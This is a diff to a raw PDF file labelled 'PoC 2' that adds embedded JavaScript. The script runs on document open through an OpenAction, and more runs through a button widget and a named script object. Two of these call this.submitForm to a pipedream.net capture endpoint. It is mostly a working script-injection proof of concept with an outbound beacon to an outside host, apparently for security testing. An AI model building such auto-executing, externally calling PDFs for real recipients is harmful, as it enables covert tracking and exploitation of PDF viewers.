@@ -1,22 +1,22 @@
 %PDF-1.4
 1 0 obj
-<< /Type /Catalog /Pages 2 0 R >>
+<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript 10 0 R >> /OpenAction << /S /JavaScript /JS (app.alert('PoC 2: XSS on Open!', 3);) >> /AcroForm << /Fields [] >> >>
 endobj
 2 0 obj
 << /Type /Pages /Kids [3 0 R] /Count 1 >>
 endobj
 3 0 obj
-<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [10 0 R] >>
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [11 0 R] >>
 endobj
 4 0 obj
-<< /Length 100 >>
+<< /Length 80 >>
 stream
 BT
 /F1 14 Tf
 100 700 Td
-(PoC 2: Click link) Tj
+(PoC 2: Click button for XSS) Tj
 100 650 Td
-(https://eoy4evvlsf7y0jq.m.pipedream.net?poc2=1) Tj
+(Big button below) Tj
 ET
 endstream
 endobj
@@ -30,10 +30,22 @@ endobj
 << /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >>
 endobj
 10 0 obj
-<< /Type /Annot /Subtype /Link /Rect [100 640 400 660] /BS << /W 1 /S /S >> /H /I /C [0 0 1] /A << /S /URI /URI (https://eoy4evvlsf7y0jq.m.pipedream.net?poc2=1) >> >>
+<< /Names [(EmbeddedJS) 12 0 R] >>
+endobj
+11 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Btn /T (XSSButton) /Rect [100 550 300 600] /BS << /W 2 /S /S >> /H /I /A << /S /JavaScript /JS (
+  app.alert('PoC 2: Button XSS!', 3);
+  this.submitForm('https://eoy4evvlsf7y0jq.m.pipedream.net?poc2_js=1');
+) >> /AP << /N << /Type /XObject /Subtype /Form /BBox [0 0 200 50] /Resources << /Font << /F1 6 0 R >> >> /Length 60 >> stream BT /F1 14 Tf 10 30 Td (Test XSS Button) Tj ET endstream >> >> >>
+endobj
+12 0 obj
+<< /S /JavaScript /JS (
+  app.alert('PoC 2: Embedded JS XSS!', 3);
+  this.submitForm('https://eoy4evvlsf7y0jq.m.pipedream.net?poc2_embed=1');
+) >>
 endobj
 xref
-0 11
+0 13
 0000000000 65535 f 
 0000000010 00000 n 
 0000000095 00000 n 
@@ -45,8 +57,10 @@ xref
 0000000000 65535 f 
 0000000000 65535 f 
 0000000613 00000 n 
+0000000775 00000 n 
+0000000949 00000 n 
 trailer
-<< /Size 11 /Root 1 0 R >>
+<< /Size 13 /Root 1 0 R >>
 startxref
-800
+1100
 %%EOF
